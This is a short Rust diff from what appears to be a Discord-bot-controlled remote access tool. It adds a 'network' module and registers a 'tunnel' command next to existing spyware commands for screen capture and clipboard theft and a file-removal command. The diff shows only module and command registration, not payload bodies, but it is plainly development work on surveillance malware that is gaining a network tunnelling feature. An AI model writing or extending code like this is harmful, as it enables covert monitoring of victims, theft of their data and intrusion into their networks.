@@ -1,5 +1,6 @@
 use crate::*;
 mod io;
+mod network;
 mod process;
 mod recon;
 mod spyware;
@@ -102,6 +103,7 @@ pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
     io::rm,
     spyware::screen,
     spyware::clipboard,
+    network::tunnel,
 ];
 
 /// Check which should be applied to all commands coming from the command chanel
